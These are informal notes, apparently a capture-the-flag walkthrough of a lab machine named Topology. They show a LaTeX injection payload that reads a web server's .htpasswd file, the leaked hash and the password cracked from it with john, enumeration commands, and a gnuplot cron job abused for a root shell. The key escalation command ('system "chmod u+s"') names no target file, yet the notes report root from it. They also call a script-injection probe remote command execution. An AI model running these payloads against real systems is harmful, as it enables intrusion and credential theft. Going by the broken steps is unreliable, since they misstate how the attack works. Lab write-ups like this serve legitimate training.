
We have the port 80 and 22 open

Running the website of a university in the 80 with this services on the website

![[Screenshot_2023-09-10_10_41_18.png]]
what web doesn't work ..i don't know why

a mail and a phone

lklein@topology.htb

+1-202-555-0143


some names

Professor Lilian Klein, PhD

Head of Topology Group



Vajramani Daisley, PhD

Post-doctoral researcher, software developer



Derek Abrahams, BEng

Master's student, sysadmin


we have a project with an input, and seems to be very vulnerable to remote command executions.

http://latex.topology.htb/equation.php


I did one and this was the result:
http://latex.topology.htb/equation.php?eqn=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&submit=

the site is working with this technologies

![[Screenshot_2023-09-10_10_49_29.png]]

I was thinking on puthing some input on base64 and wait to the output decoding something

```
┌──(cds㉿kali)-[~/Documents/htb/topology/content]
└─$ echo "<?php system('whoami') ?>"| base64 ;echo

PD9waHAgc3lzdGVtKCd3aG9hbWknKSA/Pgo=

```
https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection?source=post_page-----99b485c380dc--------------------------------
this is an interesting site where is telling what we can do to exploit this kind of inputs


There is another place where the /etc/passwd are, another folder , i think on websites environments are in
```
var/www/dev/.htpasswd
```
the command to get this file is 

```
$\lstinputlisting{/var/www/dev/.htpasswd}$
```
I think we need to get this hash because if we connect to the machine with remote commands we will be www-data

![[Screenshot_2023-09-10_11_51_55.png]]
vdaisley: $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

So this is the hash

the user is vdaisley

maybe this work for remote execution

this is the way to do it
```
\input{output}
```

THere on payload all the things we have the answer

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection
We have a response telling that this is an ilegal comand , when we put "\input" so, we only can try to decode the hash

```
john -w:/usr/share/wordlist/rockyou.txt hash.txt
```
$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

this is the pass 
```
calculus20
```


NOTHING 

id

NOTHING

sudo -l


NOTHING

find / -perm 4000 2>/dev/null




NOTHING
cappablilities

getcap -r / 2>/dev/null





with pspy we can see that on the system, its executing one time and again and again this command
	

```
/bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \; 
```

I cant read it, apparently I have no permissions to do it 

```
-bash-5.0$ ls -l  /opt/gnuplot
ls: cannot open directory '/opt/gnuplot': Permission denied
```

this is the content of opt, and the root is the owner

```
drwx-wx-wx 2 root root 4096 Sep 10 08:10 gnuplot
```

The way to root this machine is very curious and I wont have the skills yet to think on a solution.

we are going to create a file .plt and we are going to insert a payload on it that give us permisions

```
echo 'system "chmod u+s"'
```

To apply the `setuid` bit to a file, we would have run:
chmod u+s
 
 chmod gu+s /home/grupo  # agrega el setuid y el setgid al usuario y al grupo respectivamente

## Setuid

### Descripción

Setuid y Setgid son términos de Unix, abreviaturas para "Set User ID" y "Set Group ID", respectivamente. Setuid, también llamado a veces "suid", y "setgid" son permisos de acceso que pueden asignarse a archivos o directorios en un sistema operativo basado en Unix.


```
echo 'system "chmod u+s"' >/opt/abcdef.plt
```

im using a bash, so when i do bash -p I have a privilegded bash

I think that is because i have a privileged permisions on the system thanks to the script 'system "chmod u+s"' 


```
-bash-5.0$ echo 'system "chmod u+s"' > /opt/gnuplot/abcdef.plt
-bash-5.0$ cat /opt/gnuplot/abcdef.plt
system "chmod u+s"
-bash-5.0$ bash -p
bash-5.0# whoami
root

```

